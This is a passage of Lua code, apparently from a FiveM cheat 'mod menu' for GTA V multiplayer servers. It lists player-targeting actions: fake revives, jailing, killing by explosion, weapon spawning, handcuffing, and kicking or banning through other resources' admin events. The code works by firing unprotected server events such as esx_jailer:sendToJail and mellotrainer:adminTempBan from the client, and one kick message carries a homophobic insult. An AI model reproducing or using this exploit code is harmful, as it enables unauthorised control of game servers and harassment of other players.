local ed = CreateObject(ec, 0, 0, 0, true, true, true)
				elseif CatMenu.Button("~g~Revive ~g~ESX") then
					TriggerServerEvent("esx_ambulancejob:revive", GetPlayerServerId(SelectedPlayer))
					TriggerServerEvent("whoapd:revive", GetPlayerServerId(SelectedPlayer))
				    TriggerServerEvent("paramedic:revive", GetPlayerServerId(SelectedPlayer))
				    TriggerServerEvent("ems:revive", GetPlayerServerId(SelectedPlayer))	 
				elseif CatMenu.Button("~g~Revive ~b~VRP") then CreatePickup(GetHashKey("PICKUP_HEALTH_STANDARD"), GetEntityCoords(GetPlayerPed(SelectedPlayer))) elseif CatMenu.Button("Give ~b~Armour ") then CreatePickup(GetHashKey("PICKUP_ARMOUR_STANDARD"), GetEntityCoords(GetPlayerPed(SelectedPlayer))) elseif CatMenu.Button("~r~Kill ~s~Player") then AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 4, 1337.0, false, true, 0.0) 
				elseif CatMenu.Button('Fire') then
				    FirePlayer(SelectedPlayer)
					elseif CatMenu.Button("Jail") then		
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(SelectedPlayer), 45 * 60)
				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(SelectedPlayer), 45 * 60)
				TriggerServerEvent("js:jailuser", GetPlayerServerId(SelectedPlayer), 45 * 60, "dude weed")
				elseif CatMenu.Button("Unjail") then
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(SelectedPlayer), 0)
				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(SelectedPlayer), 0)
				TriggerServerEvent("esx_jail:unjailQuest", GetPlayerServerId(SelectedPlayer))
				TriggerServerEvent("js:removejailtime", GetPlayerServerId(SelectedPlayer))	
				elseif CatMenu.Button("~g~Give All Weapons") then
					for i = 1, #allWeapons do
						GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, false)
					end
				elseif CatMenu.MenuButton("Weapon Menu", "SingleWepPlayer") then
				elseif CatMenu.Button("Spawn Vehicle") then
					local ped = GetPlayerPed(SelectedPlayer)
					local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)

					if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
						RequestModel(ModelName)
						while not HasModelLoaded(ModelName) do
							Citizen.Wait(0)
						end

						local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(ped), GetEntityHeading(ped), true, true)
					else
						drawNotification("~r~Model is not valid!")
					end
				elseif CatMenu.Button("Cuff ~g~ESX") then
					TriggerServerEvent("esx_policejob:handcuff", GetPlayerPed(SelectedPlayer))
				elseif CatMenu.Button("Kick Vehicle") then
					ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))	
				elseif CatMenu.Button("~r~MelloTrainer ~s~KILL") then
					TriggerServerEvent("mellotrainer:s_adminKill", GetPlayerServerId(SelectedPlayer))
				elseif CatMenu.Button("~r~MelloTrainer ~s~BAN") then
					TriggerServerEvent( 'mellotrainer:adminTempBan', GetPlayerServerId(SelectedPlayer))
				elseif CatMenu.Button("~r~MelloTrainer ~s~KICK") then
					TriggerServerEvent( 'mellotrainer:adminKick', GetPlayerServerId(SelectedPlayer), "Kicked: You have been kicked from the server." )
					TriggerServerEvent("EasyAdmin:kickPlayer", GetPlayerServerId(SelectedPlayer), "YOU GAY" )
					end
				
			
				

				CatMenu.Display()
			elseif CatMenu.IsMenuOpened("SingleWepPlayer") then
				for i = 1, #allWeapons do
					if CatMenu.Button(allWeapons[i]) then
						GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, true)
					end
				end

				CatMenu.Display()
			elseif IsDisabledControlPressed(0, 121) then
				CatMenu.OpenMenu("MainMenu")
			end

			Citizen.Wait(0)
		end
	end
)

RegisterCommand("killmenu", function(source,args,raw)
	Enabled = false
end, false)
